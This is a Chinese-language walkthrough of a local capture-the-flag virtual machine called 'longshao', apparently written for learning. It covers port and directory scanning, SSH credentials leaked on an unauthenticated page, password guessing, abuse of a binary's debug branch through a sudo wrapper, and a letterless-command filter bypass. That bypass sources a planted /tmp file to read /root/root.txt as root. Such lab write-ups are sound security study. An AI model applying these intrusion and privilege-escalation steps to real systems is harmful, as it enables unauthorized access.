---
名称: longshao
作者: Sublarge
靶机ip: "192.168.56.108"
难度: Easy-Medium
---

> 关联：[[index|靶机记录]]、[[../常用命令/index|常用命令]]、[[../安全学习/rce提权/提权总览|提权总览]]

# 信息收集

靶机是本地 VirtualBox 网段里的机器，IP 是 `192.168.56.108`。

```bash
┌──(kali㉿JYlover)-[~/tmp]
└─$ nmap -p- 192.168.56.108
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-03 17:16 +0800
Nmap scan report for 192.168.56.108
Host is up (0.0084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

开放端口很少，就 SSH 和 HTTP。
# Web 渗透

## 目录扫描
```bash
  ~    dirsearch -u  192.168.56.108

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12289

Target: http://192.168.56.108/

[19:57:59] Scanning:
[19:58:10] 200 -   820B - /cgi-bin/printenv
[19:58:10] 200 -    1KB - /cgi-bin/test-cgi
[19:58:11] 200 -    2KB - /dashboard.php
[19:58:15] 200 -    3KB - /index.php
[19:58:15] 200 -    3KB - /index.php/login/
[19:58:26] 403 -   317B - /server-status
[19:58:26] 403 -   317B - /server-status/

Task Completed
```

发现 `dashboard.php` 可以直接访问：

```bash
curl http://192.168.56.108/dashboard.php
```

![](file-20260603200020113.png)
页面里直接给了 SSH 凭据：

```html
baolong:jinhua
```

这一步比较白给，登录 SSH：

```bash
ssh baolong@192.168.56.108
# password: jinhua
```

成功拿到第一个用户：

```bash
baolong@longshao:~$ id
uid=1000(baolong) gid=1000(baolong) groups=1000(baolong)

baolong@longshao:~$ ls
user.txt

baolong@longshao:~$ cat user.txt
flag{user-3408c2a9ca636da4a40f054eea401fd9}
```

# 提权

先跑基础枚举：

```bash
uname -a
cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
sudo -l
```

用户有三个：

```bash
cat /etc/passwd
```

```text
baolong:x:1000:1000::/home/baolong:/bin/bash
chaojibaolong:x:1001:1001::/home/chaojibaolong:/bin/bash
chaojiwudilong:x:1002:1002::/home/chaojiwudilong:/bin/bash
```

这里很明显不是直接到 root，应该要横向。

## 横向到 chaojibaolong

发现 `/opt/internal` 下面有一个只能 `chaojibaolong` 组执行的文件：

```bash
baolong@longshao:~$ ls /opt/internal/ -la
total 24
drwxr-xr-x    2 root     root              4096 May 28 11:08 .
drwxr-xr-x    3 root     root              4096 May 26 15:33 ..
-rwxr-x---    1 root     chaojibaolong    14152 May 28 11:08 parser_core
```

这个就是提示我们要先横向到 `chaojibaolong`。

弱口令爆破出来出来：
![](file-20260603200358659.png)

登录：

```bash
ssh chaojibaolong@192.168.56.108
# password: love123
```

## parser_core 分析

运行一下：

```bash
chaojibaolong@longshao:/opt/internal$ ./parser_core
[!] Security Violation: Core parser must retain eUID 0.
```

拉回本地放汇编一下：


```bash
scp chaojibaolong@192.168.56.108:/opt/internal/parser_core /tmp/parser_core
```

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  const char *v3; // rbp
  _BOOL8 v4; // r14
  int v5; // eax
  unsigned int v6; // ebx

  if ( getuid() )
  {
    fwrite("[!] Security Violation: Core parser must retain eUID 0.\n", 1uLL, 0x38uLL, (FILE *)&dword_0);
    return 1;
  }
  if ( (unsigned int)(a1 - 2) > 1 )
  {
    puts("[!] Parameter Error: Invalid cluster argument count.");
    return 1;
  }
  v3 = a2[1];
  LODWORD(v4) = 0;
  if ( a1 == 3 )
    v4 = strcmp(a2[2], "--debug") == 0;
  v5 = strlen(v3);
  if ( v5 <= 3 || strcmp(&v3[v5 - 4], ".log") )
  {
    puts("[!] Compliance Error: Only *.log files are authorized.");
    return 1;
  }
  if ( strncmp(v3, "/tmp/", 5uLL) )
  {
    puts("[!] Path Restriction: Access denied.");
    return 1;
  }
  puts("=================================================");
  puts("  ChaoJiBaoLong Log Analyser - Security Core v3  ");
  puts("=================================================");
  v6 = access(v3, 0);
  if ( v6 )
  {
    puts("[!] Error: Target log file not found.");
    if ( v4 )
    {
      puts("[*] DevSecOps Emergency Notice: Switching context...");
      execl("/bin/su", "su", "-", "chaojiwudilong", 0LL);
    }
    return 1;
  }
  puts("[*] Reading log file...");
  puts("[+] Analysis completed successfully.");
  return v6;
}
```

看不懂，这里ai帮忙分析一下：
![](file-20260603201136828.png)
很明显这就是一个横向的点
横向到`chaojiwudilong`

重新看 `sudo -l` :

```bash
chaojibaolong@longshao:/opt/internal$ sudo -l
Matching Defaults entries for chaojibaolong on longshao:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for chaojibaolong:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User chaojibaolong may run the following commands on longshao:
    (ALL : ALL) NOPASSWD: /usr/local/bin/check_parser
```
可以root执行这个程序
看一下 `check_parser`：

```bash
chaojibaolong@longshao:/opt/internal$ cat /usr/local/bin/check_parser
```
![](file-20260603201427886.png)
依旧ai分析一手
![](file-20260603201538351.png)
意思是我们虽然不能sudo执行`parser_core`，但是可以执行`check_parser`
然后会间接调用 `parser_core` ，然后触发 `--debug` 分支切到 `chaojiwudilong`。
![](file-20260603201857925.png)

拿到 `chaojiwudilong`：
## chaojiwudilong 到 root

继续看 sudo：
![](file-20260603201927295.png)
查看脚本：

```bash
chaojiwudilong@longshao:~$ cat /usr/local/bin/a.sh
```

```sh
PATH=/usr/bin

cd /tmp

read CMD < <(head -n1 | tr -d "[A-Za-z0-9/]")
eval "$CMD"
```

这个脚本会读取第一行输入，把字母、数字、斜杠都删掉，然后 `eval`。
也就是 无字母数字RCE嘛，但是之前只做过php的
看起来过滤挺狠，但是还保留了 `.`、空格、`!` 这种符号。
>我们知道：
>在shell中可以通过: `. <文件名>`，来执行文件的
![](file-20260603202952256.png)

我们可以在 `/tmp` 下放一个文件名叫 `!` 的脚本，然后输入：

```bash
. !
```

过滤后还是：

```bash
. !
```


先写 payload：

```bash
cat > /tmp/! << 'EOF'
/bin/cat /root/root.txt > /tmp/root.out 2>&1
id >> /tmp/root.out 2>&1
EOF
```

然后通过 `a.sh` 触发：

```bash
printf '. !\n' | sudo /usr/local/bin/a.sh
```

读取结果：

```bash
cat /tmp/root.out
```

成功：

```text
flag{root-e0bf0dabcccb7d4519c0ad4b431aff16}
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

# 总结

这台机器主线还是比较清晰的：

```text
Web 未授权 dashboard.php
-> 泄露 baolong:jinhua
-> 横向 chaojibaolong:love123
-> sudo check_parser
-> parser_core --debug 切到 chaojiwudilong
-> sudo a.sh
-> 利用符号绕过过滤，source /tmp/!
-> root
```

几个坑点：

1. `parser_core` 不是直接提权点，它是配合 `sudo /usr/local/bin/check_parser` 用的。
2. 横向后一定要重新跑 `sudo -l`，不然很容易绕远。
3. `a.sh` 过滤了字母数字和 `/`，但是没过滤 `.` 和 `!`，所以 `. !` 这种 shell 语法可以绕。
4. `PATH=/usr/bin`，payload 里用 `cat` 会找不到，所以要写 `/bin/cat`。

